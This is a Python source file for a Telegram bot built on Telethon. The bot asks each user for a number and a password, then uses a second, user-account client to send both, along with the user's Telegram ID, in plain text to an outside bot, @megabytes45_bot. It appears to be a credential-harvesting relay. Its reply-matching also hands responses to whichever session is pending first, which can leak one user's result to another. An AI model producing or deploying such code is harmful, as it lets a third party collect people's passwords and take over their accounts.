import os
import asyncio
from telethon import TelegramClient, events

# Retrieve configuration from environment variables
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')

# Initialize both clients at the global level to prevent multiple login attempts
bot_client = TelegramClient('bot_auth_session', API_ID, API_HASH)
user_client = TelegramClient('user_forward_session', API_ID, API_HASH)

# Dictionary to manage user states and track pending replies
# Format: { sender_id: { 'step': str, 'number': str, 'password': str, 'future': asyncio.Future } }
user_sessions = {}

@bot_client.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    sender_id = event.sender_id
    user_sessions[sender_id] = {'step': 'waiting_number'}
    await event.respond("Welcome! Please send your number.")

@bot_client.on(events.NewMessage)
async def sequence_handler(event):
    sender_id = event.sender_id
    incoming_text = event.message.message

    # Ignore start command in the general handler
    if incoming_text == '/start':
        return

    if sender_id not in user_sessions:
        user_sessions[sender_id] = {'step': 'waiting_number'}
        await event.respond("Welcome! Please send your number.")
        return

    state = user_sessions[sender_id]

    if state['step'] == 'waiting_number':
        state['number'] = incoming_text
        state['step'] = 'waiting_password'
        await event.respond("Please send your password.")
        
    elif state['step'] == 'waiting_password':
        state['password'] = incoming_text
        state['step'] = 'processing'
        await event.respond("Processing your request, please wait...")

        # Create a Future object to wait for the specific response from the other bot
        loop = asyncio.get_running_loop()
        state['future'] = loop.create_future()

        # Construct and send the payload via the user client
        payload = f"Number: {state['number']}\nPassword: {state['password']}\nUser_ID: {sender_id}"
        await user_client.send_message('@megabytes45_bot', payload)

        try:
            # Wait for the future to resolve with a timeout of 30 seconds
            response_text = await asyncio.wait_for(state['future'], timeout=30.0)
            await event.respond(f"Response received:\n{response_text}")
        except asyncio.TimeoutError:
            await event.respond("Error: Request timed out. The external bot did not reply in time.")
        finally:
            # Clean up user state after completion
            user_sessions.pop(sender_id, None)

# Global handler on the user_client to intercept replies from the external bot
@user_client.on(events.NewMessage(from_users='@megabytes45_bot'))
async def external_bot_reply_handler(event):
    reply_text = event.message.message
    
    # In a real scenario, you need a way to map the incoming reply back to the original user.
    # If the external bot doesn't echo the User_ID, we look for the first active pending session.
    for sender_id, state in list(user_sessions.items()):
        if state.get('step') == 'processing' and 'future' in state:
            future = state['future']
            if not future.done():
                future.set_result(reply_text)
                break

async def main():
    # Start both clients concurrently
    await bot_client.start(bot_token=BOT_TOKEN)
    await user_client.start()
    
    # Run until both are disconnected
    await asyncio.gather(
        bot_client.run_until_disconnected(),
        user_client.run_until_disconnected()
    )

if __name__ == '__main__':
    asyncio.run(main())
